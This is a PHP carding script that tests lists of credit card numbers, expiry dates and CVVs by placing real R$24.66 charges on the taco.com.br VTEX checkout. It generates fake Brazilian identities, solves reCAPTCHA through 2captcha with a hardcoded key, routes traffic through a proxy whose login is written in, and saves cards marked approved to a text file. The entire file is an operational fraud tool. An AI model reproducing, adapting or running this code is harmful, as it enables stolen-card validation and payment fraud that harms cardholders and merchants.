<?php
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');

$lista = str_replace(array(" "), '/', $_GET['lista']);
$regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);

if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex,$lista)){
$resultado = '<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Cartão não informado. </span> ➔ <span class="text-warning">@bacana7</span><br>';
} else {

$lista = $lista[0];
$cc = explode("|", $lista)[0];
$mes = explode("|", $lista)[1];
$ano = explode("|", $lista)[2];
$cvv = explode("|", $lista)[3];

function getStr($string, $start, $end) {
 $str = explode($start, $string);
 $str = explode($end, $str[1]);  
 return $str[0];
}


function multiexplode($string) {
 $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<", " ");
 $one = str_replace($delimiters, $delimiters[0], $string);
 $two = explode($delimiters[0], $one);
 return $two;
}

$cookieDir = __DIR__."/cookie.txt";

if(file_exists($cookieDir)){ unlink($cookieDir); }

extract($_GET);
$lista = str_replace(" " , "|", $lista);
$lista = str_replace("%20", "|", $lista);
$lista = preg_replace('/[ -]+/' , '-' , $lista);
$lista = str_replace("/" , "|", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];
$lista = ("$cc|$mes|$ano|$cvv");

switch($ano){
case 2030: $ano = "30"; break;
case 2031: $ano = "31"; break;
case 2021: $ano = "21"; break;
case 2022: $ano = "22"; break;
case 2023: $ano = "23"; break;
case 2024: $ano = "24"; break;
case 2025: $ano = "25"; break;
case 2026: $ano = "26"; break;
case 2027: $ano = "27"; break;
case 2028: $ano = "28"; break;
case 2029: $ano = "29"; break;
}


$bin = substr($cc,0,6);
$cc1 = substr($cc,0,8);


function get2Cap($key,$gkey,$pageUrl){

   $curl=curl_init();
   curl_setopt_array($curl,array(CURLOPT_URL => "https://2captcha.com/in.php?key=$key&method=userrecaptcha&googlekey=$gkey&pageurl=$pageUrl&json=1",
       CURLOPT_RETURNTRANSFER => true,
   ));
   $response = curl_exec($curl);
   $id = json_decode($response, true) ["request"];

   while (true)
   {
    usleep(200);

    $curl = curl_init();
    curl_setopt_array($curl, array(CURLOPT_URL => "https://2captcha.com/res.php?key=$key&action=get&id=$id&json=1",
        CURLOPT_RETURNTRANSFER => true,
    ));

    $response = curl_exec($curl);
    $resposta = json_decode($response, true) ["request"];

    if ($resposta != "CAPCHA_NOT_READY")
    {
        return $resposta; 
        break;
    }

}

}


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://bins.su/');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Content-Type: application/x-www-form-urlencoded',
'Host: bins.su'));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=searchbins&bins='.$bin.'&bank=&country=');
$dados1 = curl_exec($ch);

$bin = getStr($dados1, 'bins<table><tr><td>BIN</td><td>Country</td><td>Vendor</td><td>Type</td><td>Level</td><td>Bank</td></tr><tr><td>','</td><td>' , 1);
$pais = getStr($dados1, '<tr><td>'.$bin.'</td><td>','</td><td>' , 1);
$bandeira = getStr($dados1, '</td><td>'.$pais.'</td><td>','</td><td>' , 1);
$tipo = getStr($dados1, '</td><td>'.$bandeira.'</td><td>','</td><td>' , 1);
$nivel = getStr($dados1, '</td><td>'.$tipo.'</td><td>','</td><td>' , 1);
$banco = getStr($dados1, '</td><td>'.$nivel.'</td><td>','</td></tr>' , 1);

$infobin = "$bandeira $banco $nivel $pais $tipo";


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.4devs.com.br/ferramentas_online.php');
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: */*',
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/102.0.0.0',
'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
));
curl_setopt($ch, CURLOPT_POSTFIELDS, "acao=gerar_pessoa&sexo=I&pontuacao=S&idade=0&cep_estado=&txt_qtde=1&cep_cidade=");
$dat = curl_exec($ch);
$email = getStr ($dat, 'email":"', '"');
$nome = getStr ($dat, 'nome":"', '"');
$cpf = getStr ($dat, 'cpf":"', '"');
$senha = getStr ($dat, 'senha":"', '"');
$nome1 = multiexplode ($nome)[0];
$sobrenome = multiexplode ($nome)[1];


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.taco.com.br/api/checkout/pub/orderForm');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieDir);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieDir);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
'referer: https://www.taco.com.br/'));
$data1 = curl_exec($ch);

$orderformid = getStr($data1, '"orderFormId":"','"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.taco.com.br/api/checkout/pub/orderForm/'.$orderformid.'/items?sc=1');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieDir);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieDir);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/json',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
'origin: https://www.taco.com.br',
'referer: https://www.taco.com.br/'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"orderItems":[{"id":"2117714","quantity":"1","seller":"1"}],"expectedOrderFormSections":["items","totalizers","clientProfileData","shippingData","paymentData","sellers","messages","marketingData","clientPreferencesData","storePreferencesData","giftRegistryData","ratesAndBenefitsData","openTextField","commercialConditionData","customData"]}');
$data1 = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.taco.com.br/api/checkout/pub/orderForm/'.$orderformid.'/attachments/clientProfileData');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieDir);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieDir);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json, text/javascript, */*; q=0.01',
'content-type: application/json; charset=UTF-8',
'x-requested-with: XMLHttpRequest',
'sec-ch-ua-mobile: ?1',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
'sec-ch-ua-platform: "Android"',
'origin: https://www.taco.com.br',
'sec-fetch-site: same-origin',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://www.taco.com.br/checkout/'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"firstEmail":"'.$email.'","email":"'.$email.'","firstName":"'.$nome1.'","lastName":"'.$sobrenome.'","document":"'.$cpf.'","phone":"+55 45 99189 5821","documentType":"cpf","isCorporate":false,"stateInscription":"","expectedOrderFormSections":["items","totalizers","clientProfileData","shippingData","paymentData","sellers","messages","marketingData","clientPreferencesData","storePreferencesData","giftRegistryData","ratesAndBenefitsData","openTextField","commercialConditionData","customData"]}');
$data1 = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.taco.com.br/api/checkout/pub/orderForm/'.$orderformid.'/attachments/shippingData');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieDir);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieDir);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json, text/javascript, */*; q=0.01',
'content-type: application/json; charset=UTF-8',
'x-requested-with: XMLHttpRequest',
'sec-ch-ua-mobile: ?1',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
'sec-ch-ua-platform: "Android"',
'origin: https://www.taco.com.br',
'sec-fetch-site: same-origin',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://www.taco.com.br/checkout/'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"logisticsInfo":[{"addressId":"5056226426043","itemIndex":0,"selectedDeliveryChannel":"delivery","selectedSla":"expresso"}],"clearAddressIfPostalCodeNotFound":false,"selectedAddresses":[{"addressId":"5056226426043","addressType":"residential","city":"Recife","complement":null,"country":"BRA","geoCoordinates":[-34.91162109375,-8.108149528503418],"neighborhood":"Imbiribeira","number":"122","postalCode":"51150-001","receiverName":"asgsgagas sagsgsa","reference":null,"state":"PE","street":"Avenida Marechal Mascarenhas de Moraes","addressQuery":"","isDisposable":true},{"addressId":"3370817617362","addressType":"search","city":"Recife","complement":null,"country":"BRA","geoCoordinates":[-34.91162109375,-8.108149528503418],"neighborhood":"Imbiribeira","number":null,"postalCode":"51150-001","receiverName":"asgsgagas sagsgsa","reference":null,"state":"PE","street":"Avenida Marechal Mascarenhas de Moraes","addressQuery":"","isDisposable":null}],"expectedOrderFormSections":["items","totalizers","clientProfileData","shippingData","paymentData","sellers","messages","marketingData","clientPreferencesData","storePreferencesData","giftRegistryData","ratesAndBenefitsData","openTextField","commercialConditionData","customData"]}');
$data1 = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.taco.com.br/api/checkout/pub/orderForm/'.$orderformid.'/attachments/paymentData');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieDir);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieDir);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json, text/javascript, */*; q=0.01',
'content-type: application/json; charset=UTF-8',
'x-requested-with: XMLHttpRequest',
'sec-ch-ua-mobile: ?1',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
'sec-ch-ua-platform: "Android"',
'origin: https://www.taco.com.br',
'sec-fetch-site: same-origin',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://www.taco.com.br/checkout/'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"payments":[{"hasDefaultBillingAddress":true,"installmentsInterestRate":0,"referenceValue":2466,"bin":"'.$cc1.'","accountId":null,"value":2466,"tokenId":null,"paymentSystem":"4","installments":1}],"giftCards":[],"expectedOrderFormSections":["items","totalizers","clientProfileData","shippingData","paymentData","sellers","messages","marketingData","clientPreferencesData","storePreferencesData","giftRegistryData","ratesAndBenefitsData","openTextField","commercialConditionData","customData"]}');
$data1 = curl_exec($ch);

$keyrecaptcha = getStr($data1, 'recaptchaKey":"', '"', 1);

    $key = "1d66ff99921239e39de437b57a7ef275";
    $gkey = "".$keyrecaptcha."";
    $pageUrl = "https://www.taco.com.br/api/checkout/pub/orderForm/".$order."/transaction";
    $recaptchaCode = get2Cap($key, $gkey, $pageUrl);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.taco.com.br/api/checkout/pub/orderForm/'.$orderformid.'/transaction');
curl_setopt($ch, CURLOPT_PROXY, 'pr.lunaproxy.com:12233'); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'user-lu3958231-region-br:Rg153393.');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieDir);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieDir);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json, text/javascript, */*; q=0.01',
'content-type: application/json; charset=UTF-8',
'x-requested-with: XMLHttpRequest',
'sec-ch-ua-mobile: ?1',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
'sec-ch-ua-platform: "Android"',
'origin: https://www.taco.com.br',
'sec-fetch-site: same-origin',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://www.taco.com.br/checkout/'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"referenceId":"'.$orderformid.'","savePersonalData":true,"optinNewsLetter":false,"value":2466,"referenceValue":2466,"interestValue":0,"expectedOrderFormSections":["items","totalizers","clientProfileData","shippingData","paymentData","sellers","messages","marketingData","clientPreferencesData","storePreferencesData","giftRegistryData","ratesAndBenefitsData","openTextField","commercialConditionData","customData"],"recaptchaKey":"'.$keyrecaptcha.'","recaptchaToken":"'.$recaptchaCode.'"}');
$data1 = curl_exec($ch);
$id = getStr($data1, '"id":"','"');
$orderId = getStr($data1, '"orderGroup":"','"');
$addressId = getStr($data1, '"addressId":"','"');
$messagess = getStr($data1, '"code":"withoutStock","text":"','"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://taco.vtexpayments.com.br/api/pub/transactions/'.$id.'/payments?orderId='.$orderId.'&redirect=false&callbackUrl=https%3A%2F%2Fwww.taco.com.br%2Fcheckout%2FgatewayCallback%2F'.$orderId.'%2F%7BmessageCode%7D&macId=31124515-e624-4bea-b012-d582c0ff26ea&sessionId=2b8838ec-18b6-4d06-a515-50b8d0fd012a&deviceInfo=c3c9NDAwJnNoPTg4OSZjZD0yNCZ0ej0xODAmbGFuZz1wdC1CUiZqYXZhPWZhbHNlJnNvdXJjZUFwcGxpY2F0aW9uPXZjcy5jaGVja291dC11aUB2Ni44Mi4wJmluc3RhbGxlZEFwcGxpY2F0aW9ucz1bInBpeC1wYXltZW50Il0=');
curl_setopt($ch, CURLOPT_PROXY, 'pr.lunaproxy.com:12233'); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'user-lu3958231-region-br:Rg153393.');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieDir);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieDir);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json, text/javascript, */*; q=0.01',
'content-type: application/json; charset=UTF-8',
'x-requested-with: XMLHttpRequest',
'sec-ch-ua-mobile: ?1',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
'sec-ch-ua-platform: "Android"',
'origin: https://www.taco.com.br',
'sec-fetch-site: same-origin',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://www.taco.com.br/checkout/'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '[{"hasDefaultBillingAddress":true,"installmentsInterestRate":0,"referenceValue":2466,"bin":"'.$cc1.'","accountId":null,"value":2466,"tokenId":null,"paymentSystem":"4","isBillingAddressDifferent":false,"fields":{"holderName":"'.$nome1.' '.$sobrenome.'","cardNumber":"'.$cc.'","validationCode":"'.$cvv.'","dueDate":"'.$mes.'/'.$ano.'","document":"90206290187","addressId":"'.$addressId.'","bin":"'.$cc1.'","deviceFingerprint":"34022437"},"installments":1,"chooseToUseNewCard":true,"id":"TACO","interestRate":0,"installmentValue":2466,"transaction":{"id":"'.$id.'","merchantName":"TACO"},"installmentsValue":2466,"currencyCode":"BRL","originalPaymentIndex":0,"groupName":"creditCardPaymentGroup"}]');
$data1 = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.taco.com.br/api/checkout/pub/gatewayCallback/'.$orderId.'');
curl_setopt($ch, CURLOPT_PROXY, 'pr.lunaproxy.com:12233'); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'user-lu3958231-region-br:Rg153393.');
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieDir);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieDir);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json, text/javascript, */*; q=0.01',
'content-type: application/json; charset=UTF-8',
'x-requested-with: XMLHttpRequest',
'sec-ch-ua-mobile: ?1',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/112.0.0.0',
'sec-ch-ua-platform: "Android"',
'origin: https://www.taco.com.br',
'sec-fetch-site: same-origin',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://www.taco.com.br/checkout/'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$data1 = curl_exec($ch);
$httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

$cod = getStr($data1, 'ReturnCode:',' - Message:');

$messag = getStr($data1, ' - Message:',' - nsu:');

$msggg = "($cod) - $messag";

if(strpos($data1, 'HTTP/1.1 200 Connection established HTTP/2 204')){
file_put_contents("aprovadas_taco.txt", "$lista - $infobin"."\n\r" ,FILE_APPEND);
$resultado = '<span class="text-success">Aprovada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-success"> (00) - Transação autorizada com sucesso. | Debitou: R$ 24,66 </span> ➔ <span class="text-warning">@bacana7</span><br>';
}
elseif(strpos($data1, 'returnCode:63')){
$resultado = '<span class="badge badge-success">Aprovada</span> ➔ <span class="badge badge-light">'.$lista.' '.$infobin.' </span> ➔ <span class="badge badge-success"> '.$msggg.' </span> ➔ <span class="badge badge-warning">@bacana7</span><br>';
}elseif(strpos($data1, 'acquirer:stone')) {
$resultado = '<span class="badge badge-danger">Reprovada</span> ➔ <span class="badge badge-light">'.$lista.' '.$infobin.' </span> ➔ <span class="badge badge-danger"> '.$msggg.' </span> ➔ <span class="badge badge-warning">@bacana7</span><br>';
}else{
$resultado = '<span class="badge badge-danger">Reprovada</span> ➔ <span class="badge badge-light">'.$lista.' '.$infobin.' </span> ➔ <span class="badge badge-danger"> '.$data1.' </span> ➔ <span class="badge badge-warning">@bacana7</span><br>';
}
}
echo $resultado;
?>
